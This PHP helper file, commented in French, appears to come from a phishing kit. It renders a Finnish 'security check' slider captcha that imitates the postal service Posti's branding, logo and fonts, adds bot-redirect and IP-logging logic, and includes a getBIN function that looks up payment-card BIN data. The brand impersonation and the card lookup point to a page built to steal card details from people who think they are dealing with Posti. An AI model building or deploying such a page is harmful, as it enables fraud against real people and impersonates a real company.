<?php
/**
 * FONCTIONS HELPERS
 * Captcha + Utilitaires
 */

/**
 * Vérifier si captcha validé
 */
function isCaptchaValidated() {
    if (isLocal(getIP())) return true;

    return isset($_SESSION['captcha_ok']) &&
           $_SESSION['captcha_ok'] === true &&
           isset($_SESSION['captcha_time']) &&
           (time() - $_SESSION['captcha_time']) < CAPTCHA_TIMEOUT;
}

/**
 * Initialiser captcha
 */
function initCaptcha() {
    $pos = rand(65, 80);
    $_SESSION['cap'] = [
        'pos' => $pos,
        'tok' => bin2hex(random_bytes(16)),
        'time' => time(),
        'tries' => 0,
        'ip' => getIP()
    ];
}

/**
 * Valider captcha
 */
function validateCaptcha($userPos, $userTok) {
    if (!isset($_SESSION['cap'])) return false;

    $cap = $_SESSION['cap'];

    // Vérifier token
    if (!hash_equals($cap['tok'], $userTok)) {
        logSec('captcha.log', 'IP: ' . getIP() . ' | Invalid token');
        return false;
    }

    // Vérifier IP
    if ($cap['ip'] !== getIP()) {
        logSec('captcha.log', 'IP: ' . getIP() . ' | IP mismatch');
        return false;
    }

    // Tentatives
    $_SESSION['cap']['tries']++;
    if ($_SESSION['cap']['tries'] > MAX_ATTEMPTS) {
        logSec('captcha.log', 'IP: ' . getIP() . ' | Max attempts');
        redirectBot('captcha_max_attempts');
    }

    // Expiration
    if ((time() - $cap['time']) > CAPTCHA_TIMEOUT) {
        unset($_SESSION['cap']);
        return false;
    }

    // Position (tolérance ±3%)
    $diff = abs($userPos - $cap['pos']);
    if ($diff <= 3) {
        logSec('captcha.log', 'IP: ' . getIP() . ' | SUCCESS');
        unset($_SESSION['cap']);
        return true;
    }

    logSec('captcha.log', 'IP: ' . getIP() . " | FAILED | Diff: $diff");

    // Régénérer
    initCaptcha();

    return false;
}

/**
 * Afficher le captcha
 */
function showCaptcha($error = '') {
    $cap = $_SESSION['cap'];
    $tok = $cap['tok'];
    $targetPos = $cap['pos'];
    $tries = MAX_ATTEMPTS - ($cap['tries'] ?? 0);

    ?>
<!DOCTYPE html>
<html lang="fi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <title>Turvatarkistus - Posti</title>
    <link rel="icon" href="https://assets.ctfassets.net/dvxpcmq06s7e/pkrFI9pZwsBhQ2lBowzyt/3c40676e510621e6adb7a1aebbe8ebc0/favicon.ico">
    <link href="https://cdn.posti.fi/asset/css/typography-posti-font.css" rel="stylesheet">
    <style>
        *{box-sizing:border-box;margin:0;padding:0}
        body{font-family:'Posti Font',Arial,sans-serif;background:#f5f7fa;color:#2A2B2D;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
        .hd{position:fixed;top:0;left:0;right:0;background:#fff;border-bottom:1px solid #e5e5e5;height:60px;display:flex;align-items:center;padding:0 24px;z-index:100}
        .logo{display:flex;align-items:center;}
        .logo img{height:40px;width:auto;display:block}
        .box{background:#fff;border-radius:16px;box-shadow:0 8px 22px rgba(27,31,35,.09);padding:48px 40px;max-width:520px;width:100%;margin-top:60px}
        .shield{width:64px;height:64px;margin:0 auto 20px;background:linear-gradient(135deg,#FF6200,#e55500);border-radius:50%;display:flex;align-items:center;justify-content:center}
        .shield svg{width:32px;height:32px;fill:#fff}
        h1{font-size:28px;font-weight:900;color:#2A2B2D;margin-bottom:8px;text-align:center}
        .sub{text-align:center;color:#666;font-size:15px;margin-bottom:36px;line-height:1.5}
        .err{background:#FFF3E0;border:1.5px solid #FF6200;border-radius:12px;padding:14px 16px;margin-bottom:20px;display:flex;gap:12px;align-items:start}
        .err svg{width:20px;height:20px;fill:#BF360C;flex-shrink:0;margin-top:2px}
        .err-txt{flex:1;font-size:13px;color:#5D4037}
        .info{background:#E3F2FD;border:1.5px solid #2196F3;border-radius:10px;padding:12px 16px;margin-bottom:28px;text-align:center;font-size:13px;color:#0D47A1;font-weight:600}
        .cap-box{background:#f8f9fa;border-radius:14px;padding:32px 24px;margin-bottom:28px;border:2px solid #e5e5e5}
        .cap-title{font-size:15px;font-weight:700;color:#2A2B2D;margin-bottom:24px;text-align:center}
        .puzzle{position:relative;background:linear-gradient(135deg,#FF6200,#FF8844,#e55500);height:220px;border-radius:12px;margin-bottom:28px;overflow:hidden;box-shadow:0 4px 16px rgba(255,98,0,.15)}
        .puzzle-bg{position:absolute;inset:0;background-image:linear-gradient(rgba(255,255,255,.1) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.1) 1px,transparent 1px);background-size:30px 30px;opacity:.6}
        .piece{position:absolute;width:70px;height:70px;background:#fff;border-radius:12px;box-shadow:0 6px 20px rgba(0,0,0,.3);top:75px;transition:left .05s ease,transform .2s ease;display:flex;align-items:center;justify-content:center;font-size:32px;z-index:5}
        .target{position:absolute;width:74px;height:74px;border:3px dashed rgba(255,255,255,.5);border-radius:12px;top:73px;background:rgba(255,255,255,.08);transition:all .3s ease}
        .target.ok{background:rgba(76,175,80,.25);border-color:#4CAF50;border-style:solid;box-shadow:0 0 20px rgba(76,175,80,.4)}
        .slider-wrap{position:relative;margin-bottom:12px}
        .track{height:56px;background:#fff;border:2px solid #ddd;border-radius:28px;position:relative;overflow:hidden;box-shadow:inset 0 2px 4px rgba(0,0,0,.05)}
        .progress{position:absolute;left:0;top:0;bottom:0;background:linear-gradient(90deg,#FF6200,#FF8844);width:0;transition:width .05s ease;border-radius:26px}
        .handle{position:absolute;width:60px;height:60px;background:#fff;border:4px solid #FF6200;border-radius:50%;top:50%;transform:translate(-50%,-50%);cursor:grab;display:flex;align-items:center;justify-content:center;box-shadow:0 4px 12px rgba(0,0,0,.15);transition:box-shadow .2s,border-color .2s;z-index:10}
        .handle:hover{box-shadow:0 6px 16px rgba(255,98,0,.3)}
        .handle:active{cursor:grabbing;box-shadow:0 6px 20px rgba(255,98,0,.5);border-width:5px}
        .handle.ok{border-color:#4CAF50}
        .handle svg{width:26px;height:26px;fill:#FF6200;transition:fill .2s}
        .handle.ok svg{fill:#4CAF50}
        .txt{position:absolute;left:0;right:0;top:50%;transform:translateY(-50%);text-align:center;font-size:14px;font-weight:700;color:#999;pointer-events:none;user-select:none;transition:opacity .2s}
        .pos-wrap{display:flex;align-items:center;justify-content:space-between;margin-top:12px;padding:0 8px}
        .pos-item{font-size:12px;color:#999;font-weight:600}
        .pos-val{font-size:14px;font-weight:900;color:#FF6200}
        .btn{width:100%;background:#FF6200;color:#fff;border:none;border-radius:30px;padding:16px;font-size:16px;font-weight:900;cursor:pointer;font-family:inherit;transition:all .2s;text-transform:uppercase;letter-spacing:.5px}
        .btn:hover:not(:disabled){background:#e55500;transform:translateY(-2px);box-shadow:0 6px 20px rgba(255,98,0,.3)}
        .btn:disabled{opacity:.5;cursor:not-allowed;background:#ccc}
        .foot{text-align:center;margin-top:28px;padding-top:24px;border-top:1px solid #e5e5e5;display:flex;align-items:center;justify-content:center;gap:8px;color:#999;font-size:12px}
        .foot svg{width:16px;height:16px;fill:#999}
        @media(max-width:600px){
            .hd{height:50px;padding:0 16px}
            .logo img{height:32px}
            .box{padding:36px 28px;margin-top:50px}
            h1{font-size:24px}
            .puzzle{height:180px}
            .piece,.target{width:60px;height:60px;top:60px}
            .piece{font-size:28px}
        }
    </style>
</head>
<body>
    <div class="hd">
        <div class="logo">
            <img src="../home/status/logo.png" alt="Posti Logo">
        </div>
    </div>
    <div class="box">
        <div class="shield">
            <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
        </div>
        <h1>Turvatarkistus</h1>
        <p class="sub">Vahvista, että olet ihminen siirtämällä liukusäädin oikeaan kohtaan</p>

        <?php if ($error): ?>
        <div class="err">
            <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
            <div class="err-txt"><strong>Virhe:</strong> <?php echo htmlspecialchars($error); ?></div>
        </div>
        <?php endif; ?>

        <?php if ($tries < MAX_ATTEMPTS): ?>
        <div class="info">Yrityksiä jäljellä: <strong><?php echo $tries; ?>/<?php echo MAX_ATTEMPTS; ?></strong></div>
        <?php endif; ?>

        <form method="POST">
            <div class="cap-box">
                <div class="cap-title">🧩 Siirrä palapeli oikeaan aukkoon</div>
                <div class="puzzle">
                    <div class="puzzle-bg"></div>
                    <div class="target" id="tg"></div>
                    <div class="piece" id="pc">🧩</div>
                </div>
                <div class="slider-wrap">
                    <div class="track">
                        <div class="progress" id="pg"></div>
                        <div class="txt" id="tx">Vedä oikealle →</div>
                        <div class="handle" id="hd">
                            <svg viewBox="0 0 24 24" id="ic"><path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z"/></svg>
                        </div>
                    </div>
                </div>
                <div class="pos-wrap">
                    <div class="pos-item">Sijainti: <span class="pos-val" id="pv">0%</span></div>
                    <div class="pos-item" id="st">Aloita vetämällä</div>
                </div>
            </div>
            <input type="hidden" name="pos" id="pos" value="0">
            <input type="hidden" name="tok" value="<?php echo htmlspecialchars($tok); ?>">
            <input type="hidden" name="captcha_submit" value="1">
            <button type="submit" class="btn" id="btn" disabled>VAHVISTA</button>
        </form>

        <div class="foot">
            <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
            <span>Suojattu bottien torjuntajärjestelmällä</span>
        </div>
    </div>

    <script>
        const T=<?php echo $targetPos; ?>,hd=document.getElementById('hd'),pg=document.getElementById('pg'),tx=document.getElementById('tx'),pv=document.getElementById('pv'),pos=document.getElementById('pos'),btn=document.getElementById('btn'),pc=document.getElementById('pc'),tg=document.getElementById('tg'),st=document.getElementById('st'),ic=document.getElementById('ic');
        let drag=false,rect,curr=0,ok=false;
        tg.style.left=T+'%';
        function start(e){drag=true;rect=hd.parentElement.getBoundingClientRect();hd.style.transition='none';pg.style.transition='none';pc.style.transition='none';document.body.style.userSelect='none'}
        function move(x){if(!drag)return;const p=Math.max(0,Math.min(100,(x-rect.left)/rect.width*100));curr=Math.round(p);hd.style.left=curr+'%';pg.style.width=curr+'%';pc.style.left=curr+'%';pv.textContent=curr+'%';pos.value=curr;tx.style.opacity=curr<15?'1':'0';const d=Math.abs(curr-T);if(d<=3&&!ok){ok=true;btn.disabled=false;pc.classList.add('ok');tg.classList.add('ok');hd.classList.add('ok');st.textContent='✓ Oikein!';st.style.color='#4CAF50';st.style.fontWeight='900';ic.innerHTML='<path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>'}else if(ok&&d>3){ok=false;btn.disabled=true;pc.classList.remove('ok');tg.classList.remove('ok');hd.classList.remove('ok');st.textContent='Jatka vetämistä';st.style.color='#999';st.style.fontWeight='600';ic.innerHTML='<path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z"/>'}}
        function stop(){if(!drag)return;drag=false;document.body.style.userSelect=''}
        hd.addEventListener('mousedown',start);
        document.addEventListener('mousemove',e=>move(e.clientX));
        document.addEventListener('mouseup',stop);
        hd.addEventListener('touchstart',e=>{e.preventDefault();start(e)});
        document.addEventListener('touchmove',e=>{if(drag&&e.touches.length>0)move(e.touches[0].clientX)});
        document.addEventListener('touchend',stop);
    </script>
</body>
</html>
    <?php
}

/**
 * Redirection
 */
function redirect($url) {
    header('Location: ' . $url, true, 302);
    exit();
}

/**
 * Obtenir BIN info
 */
function getBIN($bin) {
    $url = "https://data.handyapi.com/bin/$bin";
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 5,
        CURLOPT_SSL_VERIFYPEER => true,
    ]);

    $res = curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($code !== 200) return null;

    $data = json_decode($res, true);
    return $data ?? null;
}
?>